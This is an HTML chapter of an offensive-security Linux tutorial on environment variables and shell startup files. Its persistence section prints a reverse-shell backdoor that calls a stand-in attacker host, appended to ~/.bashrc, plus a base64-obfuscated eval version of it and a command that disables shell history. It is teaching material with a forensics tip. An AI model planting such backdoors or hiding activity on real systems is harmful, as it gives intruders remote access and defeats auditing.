@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Chapter 8 of the 0XMAP Linux for Hackers field guide. See how shell startup files and environment variables become persistence and evasion.">
+  <title>Chapter 08: Environment Variables and .bashrc Abuse | 0XMAP Linux Field Guide</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Chapter 08</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Chapter navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Chapters</p>
+      <p class="g-sidebar-count">30 chapters / 5 sections</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close chapter menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">01</span><span>Foundations</span></div><ol><li><a class="g-nav-link" href="../chapters/01-introduction-and-why-linux-matters-in-hacking.html" ><span class="g-nav-num">01</span><span class="g-nav-title">Why Linux matters</span></a></li><li><a class="g-nav-link" href="../chapters/02-basic-file-navigation-in-linux.html" ><span class="g-nav-num">02</span><span class="g-nav-title">File navigation</span></a></li><li><a class="g-nav-link" href="../chapters/03-understanding-linux-file-permissions.html" ><span class="g-nav-num">03</span><span class="g-nav-title">File permissions</span></a></li><li><a class="g-nav-link" href="../chapters/04-users-groups-and-privilege-escalation-basics.html" ><span class="g-nav-num">04</span><span class="g-nav-title">Users and groups</span></a></li><li><a class="g-nav-link" href="../chapters/05-linux-package-managers-and-dependency-abuse.html" ><span class="g-nav-num">05</span><span class="g-nav-title">Package managers</span></a></li><li><a class="g-nav-link" href="../chapters/06-introduction-to-bash-scripting.html" ><span class="g-nav-num">06</span><span class="g-nav-title">Bash scripting</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">02</span><span>Shell and scheduling</span></div><ol><li><a class="g-nav-link" href="../chapters/07-bash-variables-arguments-and-dynamic-scripting.html" ><span class="g-nav-num">07</span><span class="g-nav-title">Bash variables</span></a></li><li><a class="g-nav-link" href="../chapters/08-environment-variables-and-bashrc-abuse.html"  aria-current="page"><span class="g-nav-num">08</span><span class="g-nav-title">Shell startup abuse</span></a></li><li><a class="g-nav-link" href="../chapters/09-processes-services-and-enumeration.html" ><span class="g-nav-num">09</span><span class="g-nav-title">Processes and services</span></a></li><li><a class="g-nav-link" href="../chapters/10-cron-jobs-scheduled-tasks-and-exploitation.html" ><span class="g-nav-num">10</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link" href="../chapters/11-ssh-access-and-abuse.html" ><span class="g-nav-num">11</span><span class="g-nav-title">SSH access and abuse</span></a></li><li><a class="g-nav-link" href="../chapters/12-file-permissions-and-privilege-escalation-basics.html" ><span class="g-nav-num">12</span><span class="g-nav-title">Permissions to privilege</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">03</span><span>Access and network</span></div><ol><li><a class="g-nav-link" href="../chapters/13-environment-variables-and-path-hijacking.html" ><span class="g-nav-num">13</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link" href="../chapters/14-logs-and-system-auditing.html" ><span class="g-nav-num">14</span><span class="g-nav-title">Logs and auditing</span></a></li><li><a class="g-nav-link" href="../chapters/15-networking-fundamentals-for-hackers.html" ><span class="g-nav-num">15</span><span class="g-nav-title">Networking</span></a></li><li><a class="g-nav-link" href="../chapters/16-firewalls-and-packet-filtering.html" ><span class="g-nav-num">16</span><span class="g-nav-title">Firewalls</span></a></li><li><a class="g-nav-link" href="../chapters/17-ssh-and-tunneling.html" ><span class="g-nav-num">17</span><span class="g-nav-title">SSH tunneling</span></a></li><li><a class="g-nav-link" href="../chapters/18-linux-kernel-and-exploit-basics.html" ><span class="g-nav-num">18</span><span class="g-nav-title">Kernel exploits</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">04</span><span>Persistence and isolation</span></div><ol><li><a class="g-nav-link" href="../chapters/19-linux-persistence-techniques.html" ><span class="g-nav-num">19</span><span class="g-nav-title">Persistence</span></a></li><li><a class="g-nav-link" href="../chapters/20-linux-services-and-daemon-exploitation.html" ><span class="g-nav-num">20</span><span class="g-nav-title">Service exploitation</span></a></li><li><a class="g-nav-link" href="../chapters/21-linux-capabilities-and-exploitation.html" ><span class="g-nav-num">21</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link" href="../chapters/22-advanced-persistence.html" ><span class="g-nav-num">22</span><span class="g-nav-title">Advanced persistence</span></a></li><li><a class="g-nav-link" href="../chapters/23-containers-and-docker-exploitation.html" ><span class="g-nav-num">23</span><span class="g-nav-title">Containers</span></a></li><li><a class="g-nav-link" href="../chapters/24-host-based-monitoring-auditd-and-osquery.html" ><span class="g-nav-num">24</span><span class="g-nav-title">Host monitoring</span></a></li></ol></section><section class="g-nav-part"><div class="g-nav-part-head"><span class="g-nav-part-num">05</span><span>Defense and workflow</span></div><ol><li><a class="g-nav-link" href="../chapters/25-linux-forensics-and-incident-response.html" ><span class="g-nav-num">25</span><span class="g-nav-title">Forensics and IR</span></a></li><li><a class="g-nav-link" href="../chapters/26-automating-linux-privilege-escalation-checks.html" ><span class="g-nav-num">26</span><span class="g-nav-title">Privilege automation</span></a></li><li><a class="g-nav-link" href="../chapters/27-linux-hardening-and-monitoring.html" ><span class="g-nav-num">27</span><span class="g-nav-title">Hardening and monitoring</span></a></li><li><a class="g-nav-link" href="../chapters/28-network-sniffing-and-packet-capture.html" ><span class="g-nav-num">28</span><span class="g-nav-title">Packet capture</span></a></li><li><a class="g-nav-link" href="../chapters/29-linux-memory-analysis-and-credential-hunting.html" ><span class="g-nav-num">29</span><span class="g-nav-title">Memory analysis</span></a></li><li><a class="g-nav-link" href="../chapters/30-building-your-linux-hacking-workflow.html" ><span class="g-nav-num">30</span><span class="g-nav-title">Workflow</span></a></li></ol></section>
+  </nav>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#privesc">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Privilege Escalation</strong>
+    <span>10 parts from sudo to NFS and kernel bugs</span>
+  </a>
+  <p class="g-sidebar-note">Authorized labs and systems only. Read in order or use the menu to jump.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#section-shell">Section 02</a><span>/</span>
+          <span>Chapter 08</span>
+        </nav>
+        <p class="g-kicker">Section 02 / Shell and scheduling</p>
+        <h1>Environment Variables and .bashrc Abuse</h1>
+        <p class="g-deck">See how shell startup files and environment variables become persistence and evasion.</p>
+        <div class="g-chapter-meta">
+          <span>3 min read</span>
+          <span>6 sections</span>
+          <span>7 code blocks</span>
+          <span>Chapter 08 / 30</span>
+        </div>
+        <div class="g-chapter-actions"><a class="g-btn ghost" data-next-chapter href="../chapters/09-processes-services-and-enumeration.html">Next chapter <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M5 12h14"/><path d="m13 6 6 6-6 6"/></svg></a></div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>6 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#what-are-environment-variables" data-toc-link>What Are Environment Variables?</a><a class="g-toc-link depth-2" href="#why-this-matters-in-hacking" data-toc-link>Why This Matters in Hacking</a><a class="g-toc-link depth-2" href="#bash-startup-files" data-toc-link>Bash Startup Files</a><a class="g-toc-link depth-2" href="#persistence-with-bashrc" data-toc-link>Persistence with .bashrc</a><a class="g-toc-link depth-3" href="#practice-task" data-toc-link>Practice Task</a><a class="g-toc-link depth-2" href="#red-team-blue-team-tips" data-toc-link>Red Team + Blue Team Tips</a></nav>
+</details>
+      <div class="g-prose"><p>Environment variables define the execution context of Linux shells. But in hacking, they can be used to hide payloads, manipulate system behavior, or establish persistence.</p>
+<hr/>
+<h2 id="what-are-environment-variables">What Are Environment Variables?<a aria-label="Link to this section" class="g-anchor" href="#what-are-environment-variables">#</a></h2>
+<p>Use these commands to list or reference variables:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">printenv
+env
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$HOME</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
+</code></pre></div>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Variable</th>
+<th>Purpose</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>$PATH</code></td>
+<td>Defines where binaries are searched</td>
+</tr>
+<tr>
+<td><code>$USER</code></td>
+<td>Current user</td>
+</tr>
+<tr>
+<td><code>$HOME</code></td>
+<td>User's home directory</td>
+</tr>
+<tr>
+<td><code>$SHELL</code></td>
+<td>Default shell</td>
+</tr>
+<tr>
+<td><code>$HISTFILE</code></td>
+<td>Shell history file path</td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="why-this-matters-in-hacking">Why This Matters in Hacking<a aria-label="Link to this section" class="g-anchor" href="#why-this-matters-in-hacking">#</a></h2>
+<p>You can override $PATH to run your own malicious binaries</p>
+<p>You can disable shell history:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">export</span><span class="w"> </span><span class="nv">HISTFILE</span><span class="o">=</span>/dev/null
+</code></pre></div>
+<p>You can leak system info using environment variables</p>
+<h2 id="bash-startup-files">Bash Startup Files<a aria-label="Link to this section" class="g-anchor" href="#bash-startup-files">#</a></h2>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>File</th>
+<th>Trigger</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>~/.bashrc</code></td>
+<td>On each interactive shell</td>
+</tr>
+<tr>
+<td><code>~/.bash_profile</code></td>
+<td>On login</td>
+</tr>
+<tr>
+<td><code>/etc/profile</code></td>
+<td>System-wide login config</td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="persistence-with-bashrc">Persistence with .bashrc<a aria-label="Link to this section" class="g-anchor" href="#persistence-with-bashrc">#</a></h2>
+<p>Inject a backdoor:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="s1">'bash -i &gt;&amp; /dev/tcp/attacker.com/4444 0&gt;&amp;1'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+</code></pre></div>
+<p>Or hide it in a more stealthy way:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="s2">"eval \$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci5jb20vNDQ0NCAwPiYx | base64 -d)"</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+</code></pre></div>
+<p>On next terminal session? Backdoor triggers.</p>
+<h3 id="practice-task">Practice Task<a aria-label="Link to this section" class="g-anchor" href="#practice-task">#</a></h3>
+<p>View <code>.bashrc</code>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">cat<span class="w"> </span>~/.bashrc
+</code></pre></div>
+<p>Add a harmless test:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="nb">echo</span><span class="w"> </span><span class="s1">'echo "Hacked by $USER on $(date)"'</span><span class="w"> </span>&gt;&gt;<span class="w"> </span>~/.bashrc
+</code></pre></div>
+<p>Open a new terminal and observe.<br/>
+To clean it:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">nano<span class="w"> </span>~/.bashrc
+</code></pre></div>
+<h2 id="red-team-blue-team-tips">Red Team + Blue Team Tips<a aria-label="Link to this section" class="g-anchor" href="#red-team-blue-team-tips">#</a></h2>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Use Case</th>
+<th>Technique</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Persistence</td>
+<td>Append payload to <code>.bashrc</code></td>
+</tr>
+<tr>
+<td>Log wiping</td>
+<td>Set <code>$HISTFILE=/dev/null</code></td>
+</tr>
+<tr>
+<td>Evasion</td>
+<td>Use base64 + eval</td>
+</tr>
+<tr>
+<td>IR / Forensics</td>
+<td>Always check <code>.bashrc</code>, <code>.profile</code>, <code>/etc/profile</code> for unusual entries</td>
+</tr>
+</tbody>
+</table></div>
+<hr/>
+<p>The next chapter covers <strong>processes and services</strong>, and how hackers use <code>ps</code>, <code>top</code>, and <code>systemctl</code> to enumerate and escalate.</p>
+</div>
+      <p class="g-source-note">Chapter 08 of the Linux for Hackers guide. Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+      <nav class="g-chapter-nav" aria-label="Chapter navigation"><a class="g-chapter-card" href="../chapters/07-bash-variables-arguments-and-dynamic-scripting.html" data-prev-chapter><span class="g-chapter-card-label">Previous / Chapter 07</span><strong>Bash Variables, Arguments and Dynamic Scripting</strong></a><a class="g-chapter-card" href="../chapters/09-processes-services-and-enumeration.html" data-next-chapter><span class="g-chapter-card-label">Next / Chapter 09</span><strong>Processes, Services and Enumeration</strong></a></nav>
+    </article>
+  </main>
+  
+<aside class="g-toc" aria-label="On this page">
+  <div class="g-toc-inner">
+    <p class="g-toc-kicker">On this page</p>
+    <nav class="g-toc-nav"><a class="g-toc-link depth-2" href="#what-are-environment-variables" data-toc-link>What Are Environment Variables?</a><a class="g-toc-link depth-2" href="#why-this-matters-in-hacking" data-toc-link>Why This Matters in Hacking</a><a class="g-toc-link depth-2" href="#bash-startup-files" data-toc-link>Bash Startup Files</a><a class="g-toc-link depth-2" href="#persistence-with-bashrc" data-toc-link>Persistence with .bashrc</a><a class="g-toc-link depth-3" href="#practice-task" data-toc-link>Practice Task</a><a class="g-toc-link depth-2" href="#red-team-blue-team-tips" data-toc-link>Red Team + Blue Team Tips</a></nav>
+    <div class="g-toc-foot">Chapter 08 / 6 sections</div>
+  </div>
+</aside>
+</div>
+<footer class="g-site-foot g-docs-foot">
+  <div class="g-foot-main">
+    <span>0XMAP field guide / 30 chapters / 2 companion handbooks</span>
+    <span>Created by 0xbit</span>
+  </div>
+  <div class="g-foot-links">
+    <a href="../index.html">Home</a>
+    <a href="../index.html#foundations">Foundations</a>
+    <a href="../index.html#privesc">Privilege escalation</a>
+    <a href="../index.html#chapters">Chapters</a>
+    <button type="button" class="g-link-btn" data-search-open>Search</button>
+  </div>
+</footer>
+  
+<div class="g-search" data-search-modal hidden>
+  <div class="g-search-panel" role="dialog" aria-modal="true" aria-labelledby="g-search-title">
+    <div class="g-search-top">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+      <label class="g-visually-hidden" for="g-search-input" id="g-search-title">Search the guide</label>
+      <input class="g-search-input" id="g-search-input" data-search-input type="search"
+             placeholder="Search chapters, handbooks and commands..." autocomplete="off" spellcheck="false">
+      <kbd>Esc</kbd>
+      <button type="button" class="g-icon-btn" data-search-close aria-label="Close search">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+      </button>
+    </div>
+    <div class="g-search-results" data-search-results></div>
+    <div class="g-search-foot">
+      <span><kbd>Up</kbd><kbd>Down</kbd> to move</span>
+      <span><kbd>Enter</kbd> to open</span>
+      <span data-search-count></span>
+    </div>
+  </div>
+</div>
+  <script src="../static/guide-data.js"></script>
+  <script src="../static/guide.js" defer></script>
+</body>
+</html>
